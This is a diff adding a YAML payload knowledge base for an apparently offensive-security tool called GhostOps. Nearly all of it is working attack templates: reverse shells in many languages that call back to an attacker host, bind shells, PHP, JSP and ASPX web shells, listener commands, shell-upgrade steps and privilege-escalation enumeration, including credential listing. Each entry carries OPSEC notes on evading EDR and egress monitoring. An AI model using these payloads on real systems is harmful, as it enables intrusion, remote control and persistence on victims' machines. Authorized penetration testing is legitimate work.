@@ -1,0 +1,357 @@
+# GhostOps payload knowledge base.
+#
+# CURATED AND VERIFIED - deliberately NOT model-generated. Gap #5 in
+# GhostOps_Plan.md 2.1 is "LLMs fabricate non-existent CVEs, wrong exploit
+# syntax, fake tool flags". A generator that asks the model for a reverse
+# shell reintroduces exactly that gap. Same principle as searchsploit_tool.py:
+# ground offensive output in real, reviewed data.
+#
+# Placeholders are substituted by literal replacement (NOT str.format), so a
+# template may contain braces freely - the PowerShell and awk entries below
+# both do.
+#     {lhost} {lport} {shell} {param}
+#
+# Per-entry fields:
+#   name      human label
+#   lang      syntax-highlight lexer
+#   runner    sh | powershell | none  -- decides how --encode wraps the payload
+#   noise     low | medium | high     -- OPSEC signal, surfaced in stealth mode
+#   requires  what must exist on the target for this to work
+#   opsec     detection note shown with the payload
+#   template  the payload itself
+
+revshell:
+
+  bash:
+    name: Bash TCP (/dev/tcp)
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "bash built with /dev/tcp support (absent on dash, ash, busybox)"
+    opsec: "Plaintext TCP. Trivially caught by egress monitoring and by EDR watching for bash with a socket fd."
+    template: |-
+      bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
+
+  bash-udp:
+    name: Bash UDP
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "bash with /dev/udp; listener must be 'nc -u -lvnp {lport}'"
+    opsec: "UDP sometimes slips past TCP-only egress rules, but is unreliable and loses output."
+    template: |-
+      bash -i >& /dev/udp/{lhost}/{lport} 0>&1
+
+  sh-fd:
+    name: POSIX sh (fd 196)
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "any POSIX shell with /dev/tcp (still a bash-ism; try when 'bash -i' is filtered)"
+    opsec: "Same network signature as the bash one-liner; only the process argv differs."
+    template: |-
+      0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196
+
+  nc-mkfifo:
+    name: netcat + mkfifo
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "nc (any build) and mkfifo - works when nc has no -e"
+    opsec: "Leaves /tmp/f on disk. Clean it up: rm -f /tmp/f"
+    template: |-
+      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {shell} -i 2>&1 | nc {lhost} {lport} > /tmp/f
+
+  nc-e:
+    name: netcat -e
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "nc compiled with -e (traditional/OpenBSD builds usually are not)"
+    opsec: "'nc -e' is a high-signal string in command-line telemetry - most EDR alerts on it by name."
+    template: |-
+      nc -e {shell} {lhost} {lport}
+
+  python3:
+    name: Python 3 (pty)
+    lang: python
+    runner: sh
+    noise: medium
+    requires: "python3 on PATH"
+    opsec: "pty.spawn gives a fully interactive TTY immediately - no upgrade step needed."
+    template: |-
+      python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("{shell}")'
+
+  python3-nopty:
+    name: Python 3 (no pty)
+    lang: python
+    runner: sh
+    noise: medium
+    requires: "python3; use where pty is unavailable (some containers)"
+    opsec: "No TTY - job control and su/sudo will not work until you upgrade the shell."
+    template: |-
+      python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["{shell}","-i"])'
+
+  php:
+    name: PHP fsockopen
+    lang: php
+    runner: sh
+    noise: medium
+    requires: "php CLI with exec() not disabled in disable_functions"
+    opsec: "Good pivot from a web shell - the php process is already expected on a web host."
+    template: |-
+      php -r '$sock=fsockopen("{lhost}",{lport});exec("{shell} -i <&3 >&3 2>&3");'
+
+  perl:
+    name: Perl
+    lang: perl
+    runner: sh
+    noise: medium
+    requires: "perl (present on nearly every Linux/BSD host)"
+    opsec: "Perl is rarely baselined as suspicious - quieter than python on hardened hosts."
+    template: |-
+      perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'
+
+  ruby:
+    name: Ruby
+    lang: ruby
+    runner: sh
+    noise: medium
+    requires: "ruby on PATH"
+    opsec: "Common on Rails hosts, where the interpreter is already running."
+    template: |-
+      ruby -rsocket -e 'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)'
+
+  nodejs:
+    name: Node.js
+    lang: javascript
+    runner: sh
+    noise: medium
+    requires: "node on PATH; the inner shell needs /dev/tcp"
+    opsec: "Useful on app servers where node is the only interpreter installed."
+    template: |-
+      node -e 'require("child_process").exec("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")'
+
+  socat:
+    name: socat (full TTY)
+    lang: bash
+    runner: sh
+    noise: medium
+    requires: "socat on the target; listener: socat file:`tty`,raw,echo=0 tcp-listen:{lport}"
+    opsec: "Best shell quality of the set - real pty, working Ctrl-C, arrow keys, tab completion."
+    template: |-
+      socat TCP:{lhost}:{lport} EXEC:'{shell}',pty,stderr,setsid,sigint,sane
+
+  awk:
+    name: awk (gawk /inet)
+    lang: awk
+    runner: sh
+    noise: medium
+    requires: "gawk specifically - mawk and busybox awk lack /inet support"
+    opsec: "awk is almost never on an EDR watchlist. Fragile, but very quiet."
+    template: |-
+      awk 'BEGIN {s = "/inet/tcp/0/{lhost}/{lport}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+  powershell:
+    name: PowerShell TCP client
+    lang: powershell
+    runner: powershell
+    noise: high
+    requires: "Windows PowerShell 2.0+"
+    opsec: "AMSI inspects this at runtime and Script Block Logging records it verbatim. Expect detection on any monitored Windows host."
+    template: |-
+      $c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
+
+  java:
+    name: Java Runtime.exec
+    lang: java
+    runner: none
+    noise: medium
+    requires: "a Java execution context (JSP, deserialization gadget, Log4Shell)"
+    opsec: "Paste into a JSP or gadget chain - this is source, not a shell one-liner."
+    template: |-
+      String[] cmd = {"/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"};
+      Process p = Runtime.getRuntime().exec(cmd);
+      p.waitFor();
+
+bindshell:
+
+  nc-mkfifo:
+    name: netcat bind (mkfifo)
+    lang: bash
+    runner: sh
+    noise: high
+    requires: "nc + mkfifo on the target; connect back with: nc {lhost} {lport}"
+    opsec: "Opens a listening port on the TARGET - visible to any port scan and usually blocked inbound by the firewall. Prefer a reverse shell."
+    template: |-
+      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {shell} -i 2>&1 | nc -l -p {lport} > /tmp/f
+
+  python3:
+    name: Python 3 bind
+    lang: python
+    runner: sh
+    noise: high
+    requires: "python3; connect with: nc {lhost} {lport}"
+    opsec: "Same caveat - an inbound listener on the target is loud and firewall-dependent."
+    template: |-
+      python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(1,2,1);s.bind(("0.0.0.0",{lport}));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("{shell}")'
+
+webshell:
+
+  php:
+    name: PHP command web shell
+    lang: php
+    runner: none
+    noise: high
+    requires: "PHP file upload or write primitive; system() not in disable_functions"
+    opsec: "A file on disk is durable evidence. Record the path and REMOVE IT during cleanup - leaving one behind is a finding against you in the report."
+    template: |-
+      <?php if(isset($_REQUEST['{param}'])){echo "<pre>";system($_REQUEST['{param}']);echo "</pre>";} ?>
+
+  php-passthru:
+    name: PHP passthru (binary-safe)
+    lang: php
+    runner: none
+    noise: high
+    requires: "PHP write primitive; passthru() enabled"
+    opsec: "passthru streams raw bytes - use when you need to pull binary output. Same cleanup obligation."
+    template: |-
+      <?php if(isset($_REQUEST['{param}'])){passthru($_REQUEST['{param}']." 2>&1");} ?>
+
+  jsp:
+    name: JSP command web shell
+    lang: java
+    runner: none
+    noise: high
+    requires: "a writable webapp directory on Tomcat/Jetty/JBoss"
+    opsec: "Tomcat access logs will show every request with the command in the query string."
+    template: |-
+      <%@ page import="java.util.*,java.io.*" %>
+      <% if (request.getParameter("{param}") != null) {
+           Process p = Runtime.getRuntime().exec(request.getParameter("{param}"));
+           BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+           String l; out.println("<pre>");
+           while ((l = r.readLine()) != null) { out.println(l); }
+           out.println("</pre>");
+      } %>
+
+  aspx:
+    name: ASPX command web shell
+    lang: html
+    runner: none
+    noise: high
+    requires: "IIS with a writable web root"
+    opsec: "w3wp.exe spawning cmd.exe is one of the most reliably detected parent/child pairs in Windows telemetry."
+    template: |-
+      <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
+      <script runat="server">
+      void Page_Load(object s, EventArgs e) {
+        string c = Request["{param}"];
+        if (c != null) {
+          ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
+          psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
+          Response.Write("<pre>" + Process.Start(psi).StandardOutput.ReadToEnd() + "</pre>");
+        }
+      }
+      </script>
+
+listener:
+
+  nc:
+    name: netcat listener
+    lang: bash
+    runner: none
+    noise: low
+    requires: "nc on YOUR machine (this runs locally, not on the target)"
+    opsec: "Runs on the attacker box - no target-side footprint."
+    template: |-
+      nc -lvnp {lport}
+
+  rlwrap:
+    name: netcat + rlwrap (history, arrow keys)
+    lang: bash
+    runner: none
+    noise: low
+    requires: "rlwrap and nc on YOUR machine"
+    opsec: "Attacker-side only. Gives readline editing on an otherwise dumb shell."
+    template: |-
+      rlwrap -cAr nc -lvnp {lport}
+
+  socat:
+    name: socat listener (full TTY)
+    lang: bash
+    runner: none
+    noise: low
+    requires: "socat on YOUR machine; pair with the socat reverse shell"
+    opsec: "Attacker-side only. Required for a true pty shell."
+    template: |-
+      socat file:`tty`,raw,echo=0 tcp-listen:{lport}
+
+  msf:
+    name: Metasploit multi/handler
+    lang: bash
+    runner: none
+    noise: low
+    requires: "metasploit-framework on YOUR machine"
+    opsec: "Attacker-side only. Use when you want session management and post modules."
+    template: |-
+      msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; run -j"
+
+tty:
+
+  python-pty:
+    name: Upgrade dumb shell to a TTY (python)
+    lang: bash
+    runner: none
+    noise: low
+    requires: "python3 on the target; run each block in order"
+    opsec: "No network activity - this only reshapes a shell you already have."
+    template: |-
+      # 1. on the target:
+      python3 -c 'import pty;pty.spawn("/bin/bash")'
+      # 2. background it:  Ctrl-Z
+      # 3. on YOUR box:
+      stty raw -echo; fg
+      # 4. back on the target (press Enter twice first):
+      export TERM=xterm; export SHELL=/bin/bash; stty rows 50 cols 200
+
+  script:
+    name: Upgrade dumb shell to a TTY (script)
+    lang: bash
+    runner: none
+    noise: low
+    requires: "util-linux 'script' on the target - use when python is absent"
+    opsec: "No network activity. Note: /dev/null discards the typescript file."
+    template: |-
+      script -qc /bin/bash /dev/null
+
+privesc:
+
+  linux-enum:
+    name: Linux privesc quick enumeration
+    lang: bash
+    runner: none
+    noise: low
+    requires: "an interactive shell on the target"
+    opsec: "Read-only enumeration. Local only - no traffic leaves the host."
+    template: |-
+      id; sudo -l 2>/dev/null
+      find / -perm -4000 -type f 2>/dev/null              # SUID binaries
+      getcap -r / 2>/dev/null                             # file capabilities
+      cat /etc/crontab; ls -la /etc/cron.*                # scheduled jobs
+      find / -writable -type d 2>/dev/null | grep -v proc # writable dirs
+      uname -a; cat /etc/os-release                       # kernel / distro
+
+  windows-enum:
+    name: Windows privesc quick enumeration
+    lang: powershell
+    runner: none
+    noise: low
+    requires: "a command shell on the target"
+    opsec: "Read-only. 'whoami /priv' is the single highest-value command here - check for SeImpersonatePrivilege."
+    template: |-
+      whoami /all
+      systeminfo
+      wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      cmdkey /list
